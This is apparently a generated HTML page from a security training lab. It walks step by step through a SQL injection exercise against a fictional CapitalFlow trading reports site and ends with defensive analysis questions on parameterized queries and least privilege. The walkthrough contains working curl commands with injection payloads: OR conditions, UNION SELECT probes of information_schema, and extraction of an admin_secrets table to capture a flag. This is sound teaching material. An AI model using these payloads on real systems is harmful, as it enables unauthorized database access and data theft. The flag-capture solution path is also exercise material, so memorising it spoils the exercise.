+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-launch-the-exercise">Step 1: Launch the Exercise</h3>
+<p>Open the platform in your browser and start the exercise environment.</p>
+<ul>
+<li>Navigate to <strong>Exercises</strong> and locate the CapitalFlow Markets track</li>
+<li>Find <strong>SQL Injection</strong> and click <strong>Launch</strong></li>
+<li>Wait for the status to change to <strong>Running</strong></li>
+<li>Note the <strong>target IP</strong> displayed in the Active Lab View</li>
+</ul>
+<h3 id="step-2-add-the-target-to-etchosts">Step 2: Add the Target to /etc/hosts</h3>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Add capitalflow-reports.lab to /etc/hosts</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;target_ip&gt; capitalflow-reports.lab&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</code></pre></div>
+</div>
+<p>Replace <code>&lt;target_ip&gt;</code> with the IP shown in the Active Lab View.</p>
+<h3 id="step-3-authenticate-and-access-the-reports-dashboard">Step 3: Authenticate and Access the Reports Dashboard</h3>
+<p>Log in as the trader and navigate to the transaction search feature.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Log in and save the session cookie</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;email=trader@capitalflow.com&amp;password=Trader2024#&quot;</span><span class="w"> </span>http://capitalflow-reports.lab/login<span class="w"> </span>-L
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Access the transactions page</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span>http://capitalflow-reports.lab/transactions
+</code></pre></div>
+</div>
+<p>Read the page HTML to understand the search form structure. Look for the form action URL (e.g., <code>/api/transactions/search</code> or <code>/transactions?q=</code>), the HTTP method, and the input field name. Record these details for crafting injection payloads.</p>
+<h3 id="step-4-test-a-normal-search">Step 4: Test a Normal Search</h3>
+<p>Perform a legitimate search to establish baseline behavior.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Search for a normal term</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=dividend&quot;</span>
+</code></pre></div>
+</div>
+<p>Review the response. Note how many results are returned and what fields each result contains (e.g., transaction_id, description, amount, date). The number of fields per result tells you the column count for the original query, which is essential for UNION-based injection.</p>
+<figure>
+<p><img alt="Transaction History search returning the trader's normal results" src="../img/cf-sqli-transactions.png" width="820" />
+  </p>
+<figcaption>A legitimate search establishes the baseline: the trader's own transactions, filtered by symbol and type. The search box feeds straight into a concatenated SQL query, which is the weakness the next step probes.</figcaption>
+</figure>
+<h3 id="step-5-test-for-sql-injection-with-a-single-quote">Step 5: Test for SQL Injection with a Single Quote</h3>
+<p>The simplest injection test is a single quote character. If the application is vulnerable, the quote breaks the SQL string literal and either triggers an error or changes the response behavior.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Send a single quote to test for injection</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=&#39;&quot;</span>
+</code></pre></div>
+</div>
+<p>Compare the response to your baseline. Look for:</p>
+<ul>
+<li><strong>SQL error messages</strong> mentioning "syntax," "query," "mysql," or "SQL" (confirms injection)</li>
+<li><strong>A server error</strong> (500 status) without a specific message (likely injectable but errors are suppressed)</li>
+<li><strong>A normal empty response</strong> (the quote may have been escaped; try other payloads)</li>
+</ul>
+<figure>
+<p><img alt="Database error banner leaking an SQLite syntax message after a single-quote injection" src="../img/cf-sqli-error.png" width="820" />
+  </p>
+<figcaption>A single quote breaks the SQL string literal and the application leaks the raw database error back to the page. The unrecognized-token message confirms the input reaches the query unescaped, which is injection proven.</figcaption>
+</figure>
+<h3 id="step-6-confirm-injection-with-or-payloads">Step 6: Confirm Injection with OR Payloads</h3>
+<p>Test whether an always-true condition changes the result set.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test always-true OR condition</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=&#39; OR &#39;1&#39;=&#39;1&quot;</span>
+</code></pre></div>
+</div>
+<p>If the response returns significantly more results than the baseline search, the OR condition was injected into the query and evaluated by the database. The search returned all transactions instead of filtering by the search term.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test always-false OR condition for comparison</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=&#39; OR &#39;1&#39;=&#39;2&quot;</span>
+</code></pre></div>
+</div>
+<p>An always-false condition should return zero results (or the same as an empty search). The contrast between the always-true and always-false responses confirms boolean-based injection.</p>
+<h3 id="step-7-check-page-source-for-query-comments">Step 7: Check Page Source for Query Comments</h3>
+<p>Developers sometimes include the generated SQL query in HTML comments for debugging. Check the response source for any query disclosure.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Search the response for SQL query comments</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=test&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;query\|SELECT\|FROM\|WHERE\|&lt;!--&quot;</span>
+</code></pre></div>
+</div>
+<p>If the response includes the generated SQL query (in comments or error output), you can see exactly how your input is inserted and craft payloads more precisely.</p>
+<h3 id="step-8-enumerate-the-database-schema">Step 8: Enumerate the Database Schema</h3>
+<p>Before extracting data from <code>admin_secrets</code>, you need to know the database structure. Check whether the application provides a schema endpoint or use information_schema queries.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check for a database schema API endpoint</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span>http://capitalflow-reports.lab/api/db-schema
+</code></pre></div>
+</div>
+<p>If the schema endpoint exists, it will list the database tables and their columns. Look for the <code>admin_secrets</code> table and note its column names.</p>
+<p>If no schema endpoint exists, use UNION SELECT against <code>information_schema</code>:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Enumerate tables via UNION injection</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=&#39; UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() -- &quot;</span>
+</code></pre></div>
+</div>
+<p>Adjust the number of NULL columns to match the original query's column count (determined from Step 4).</p>
+<h3 id="step-9-determine-the-column-count-for-union">Step 9: Determine the Column Count for UNION</h3>
+<p>If you have not confirmed the column count, test incrementally.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test with 3 columns</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=&#39; UNION SELECT NULL,NULL,NULL -- &quot;</span>
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test with 4 columns</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=&#39; UNION SELECT NULL,NULL,NULL,NULL -- &quot;</span>
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test with 5 columns</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=&#39; UNION SELECT NULL,NULL,NULL,NULL,NULL -- &quot;</span>
+</code></pre></div>
+</div>
+<p>The query that does not produce an error confirms the column count. Record the number for use in the extraction step.</p>
+<h3 id="step-10-extract-data-from-admin_secrets">Step 10: Extract Data from admin_secrets</h3>
+<p>With the column count confirmed and the table structure known, craft a UNION SELECT to extract data from the <code>admin_secrets</code> table where user_id is 1337.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Extract admin secrets for user_id 1337</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cf-reports-cookies.txt<span class="w"> </span><span class="s2">&quot;http://capitalflow-reports.lab/api/transactions/search?q=&#39; UNION SELECT secret_key,secret_value,NULL,NULL FROM admin_secrets WHERE user_id=1337 -- &quot;</span>
+</code></pre></div>
+</div>
+<p>Adjust the column positions and names based on the schema information you gathered in Step 8. The response should include the admin secret data alongside (or instead of) the normal transaction results. Look for the flag in <code>OCR{...}</code> format within the extracted data.</p>
+<hr />
+<h2 id="record-your-findings">Record Your Findings</h2>
+<blockquote>
+<p>Document each phase of the SQL injection attack below.</p>
+<p><strong>Search endpoint details:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>URL</td>
+<td></td>
+</tr>
+<tr>
+<td>Method</td>
+<td></td>
+</tr>
+<tr>
+<td>Parameter name</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Injection confirmation:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Response Behavior</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>'</code> (single quote)</td>
+<td></td>
+</tr>
+<tr>
+<td><code>' OR '1'='1</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>' OR '1'='2</code></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Column count:</strong> ____</p>
+<p><strong>Database tables discovered:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>(list tables here)
+</code></pre></div>
+<p><strong>admin_secrets extraction:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>(paste extracted data here)
+</code></pre></div>
+<p><strong>Flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>OCR{...}
+</code></pre></div>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. The transaction search concatenated user input directly into the SQL query. What is a parameterized query, and how does it prevent SQL injection?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>A parameterized query (also called a prepared statement) separates the SQL code from the user-supplied data. The query template contains placeholders (e.g., <code>?</code> or <code>%s</code>) instead of concatenated strings. The database engine compiles the query structure first, then inserts the user data into the placeholders as literal values. Because the data is never interpreted as SQL code, injection syntax like <code>' OR '1'='1</code> is treated as a literal search term rather than SQL logic. Parameterized queries are the primary defense against SQL injection.</p>
+</details>
+<p><strong>2. Why does UNION-based SQL injection require matching the column count of the original query? What error would you expect if the column counts do not match?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The SQL UNION operator appends the results of one SELECT query to another, and both queries must produce the same number of columns. When the column counts do not match, the database engine returns an error (typically "The used SELECT statements have a different number of columns" in MySQL). Attackers determine the correct column count by incrementally adding NULL values until the error disappears, confirming the original query's structure.</p>
+</details>
+<p><strong>3. The application had a <code>/api/db-schema</code> endpoint that exposed table and column names. Even without that endpoint, how could an attacker discover the database structure through SQL injection alone?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The attacker can query the <code>information_schema</code> database, which every MySQL installation includes. The <code>information_schema.tables</code> table lists all table names, and <code>information_schema.columns</code> lists all column names for each table. By using UNION SELECT against these system tables, the attacker can enumerate the entire database structure without any external documentation. For example: <code>' UNION SELECT table_name,column_name,NULL,NULL FROM information_schema.columns WHERE table_schema=database() --</code> returns every column in the current database.</p>
+</details>
+<p><strong>4. Beyond parameterized queries, name two additional defenses that reduce the impact of SQL injection even if a vulnerability exists.</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>The principle of least privilege limits the database user's permissions to only what the application needs. If the web application's database account can only SELECT from the transactions table, an attacker who achieves injection cannot access other tables like admin_secrets. Web application firewalls (WAFs) inspect incoming requests for common injection patterns and block them before they reach the application. Neither defense replaces parameterized queries, but both reduce the blast radius when a vulnerability slips through code review.</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li><strong>SQL injection</strong> exploits applications that concatenate user input into SQL queries, allowing attackers to alter query logic and extract unauthorized data</li>
+<li><strong>UNION-based injection</strong> appends a second SELECT query to the original, enabling data extraction from any table the database user can access</li>
+<li><strong>Parameterized queries</strong> are the primary defense; they ensure user input is always treated as data, never as SQL code</li>
+<li><strong>Schema enumeration</strong> through <code>information_schema</code> gives attackers a complete map of the database structure, even without application documentation</li>
+<li><strong>Defense in depth</strong> combines parameterized queries with least-privilege database accounts, input validation, and web application firewalls to minimize both the likelihood and impact of injection</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
